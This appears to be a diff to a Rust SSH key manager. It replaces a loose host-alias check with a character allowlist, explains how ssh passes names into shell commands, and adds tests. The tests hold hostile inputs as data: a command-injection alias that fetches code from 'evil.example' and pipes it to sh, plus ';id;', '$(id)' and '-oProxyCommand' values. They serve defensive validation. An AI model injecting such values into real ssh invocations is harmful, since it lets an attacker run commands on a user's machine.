@@ -211,10 +211,25 @@ fn key_blob(public_key: &str) -> AppResult<String> {
         .ok_or_else(|| AppError::invalid("not a public key"))
 }
 
-/// A host alias as `ssh` takes it on the command line.
+/// A host alias the app runs `ssh` (or a terminal with `ssh`) with: letters,
+/// digits and `. _ - @ : [ ]`, not starting with `-`. Every command that
+/// hands a name from the page to `ssh` checks it here.
+///
+/// `ssh` puts the name into commands it runs through the shell: `%h` and `%n`
+/// in a `ProxyCommand` or `Match exec`, and the command a `ProxyJump`
+/// becomes. Only OpenSSH 9.6 and later refuse a name with shell syntax
+/// there, so without this a script in the page could run its own commands
+/// through a `Host *.corp` block that is already in the config.
 pub fn check_alias(alias: &str) -> AppResult<()> {
-    if alias.is_empty() || alias.starts_with('-') || alias.chars().any(char::is_whitespace) {
-        return Err(AppError::invalid("not a host alias"));
+    let plain = !alias.is_empty()
+        && !alias.starts_with('-')
+        && alias
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._-@:[]".contains(c));
+    if !plain {
+        return Err(AppError::invalid(
+            "not a host alias: only letters, digits and . _ - @ : [ ] can be used",
+        ));
     }
     Ok(())
 }
@@ -239,6 +254,9 @@ pub struct SshRun {
 /// Without secrets nothing is answered, as in batch mode, but the prompts
 /// are still recorded: a key `ssh` could not open tells more than the
 /// server's "Permission denied" that follows.
+///
+/// An alias [`check_alias`] refuses fails with `invalid_input` before `ssh`
+/// runs.
 pub fn run_ssh(
     state: &AppState,
     alias: &str,
@@ -248,6 +266,7 @@ pub fn run_ssh(
     input: Option<Vec<u8>>,
     timeout: Duration,
 ) -> AppResult<SshRun> {
+    check_alias(alias)?;
     let target = match ssh_target(alias)? {
         Ok(target) => target,
         // `ssh` cannot read its configuration for this host: report what it
@@ -469,14 +488,95 @@ const READ_SCRIPT: &str = concat!(
 
 #[cfg(test)]
 mod tests {
+    use sshkm_core::ErrorCode;
+    use sshkm_core::paths::SshPaths;
+
     use super::*;
 
     #[test]
     fn aliases() {
-        assert!(check_alias("prod").is_ok());
-        assert!(check_alias("alice@example.com").is_ok());
-        for bad in ["", "-oProxyCommand=x", "a b", "a\nb"] {
-            assert!(check_alias(bad).is_err(), "{bad:?}");
+        for alias in [
+            "prod",
+            "prod-api",
+            "web_01",
+            "bastion.example.net",
+            "alice@example.com",
+            "git@github.com",
+            "10.0.4.12",
+            "fe80::1",
+            "[::1]:22",
+            "[2001:db8::5]",
+            "a",
+        ] {
+            assert!(check_alias(alias).is_ok(), "{alias:?}");
+        }
+        // Options, patterns, anything a shell treats specially, and names a
+        // terminal would split.
+        for alias in [
+            "",
+            "-oProxyCommand=x",
+            "-",
+            "a b",
+            "a\tb",
+            "a\nb",
+            "a\0b",
+            "*",
+            "web-*",
+            "db?",
+            "!old",
+            "a'$({curl,-s,evil.example}|sh)'.corp",
+            "x';id;'.internal",
+            "a;b",
+            "a&b",
+            "a|b",
+            "a`id`",
+            "$(id)",
+            "${IFS}",
+            "a\"b",
+            "a\\b",
+            "a<b",
+            "a>b",
+            "(a)",
+            "{a,b}",
+            "a%h",
+            "a,b",
+            "a/b",
+            "a~b",
+            "a=b",
+            "a#b",
+            "сервер",
+            "ｐｒｏｄ",
+        ] {
+            let error = check_alias(alias).expect_err(alias);
+            assert_eq!(error.code(), ErrorCode::InvalidInput, "{alias:?}");
+        }
+    }
+
+    /// The commands refuse such an alias before `ssh -G` runs.
+    #[test]
+    fn runs_refuse_aliases_with_shell_syntax() {
+        let home = tempfile::tempdir().unwrap();
+        let state = AppState::new(
+            SshPaths::with_home(home.path(), home.path().join(".ssh")),
+            home.path().join("hosts"),
+            home.path().join("backups"),
+            home.path().join("data"),
+        );
+        for alias in ["x';id;'.internal", "-oProxyCommand=id", "*"] {
+            let run = run_ssh(
+                &state,
+                alias,
+                &[],
+                &["exit"],
+                Secrets::default(),
+                None,
+                Duration::from_secs(1),
+            );
+            let install = install_key(&state, alias, "k", Secrets::default());
+            let read = read_server_keys(&state, alias, &ServerKeysAction::List, Secrets::default());
+            for error in [run.err(), install.err(), read.err()] {
+                assert_eq!(error.expect(alias).code(), ErrorCode::InvalidInput);
+            }
         }
     }
 
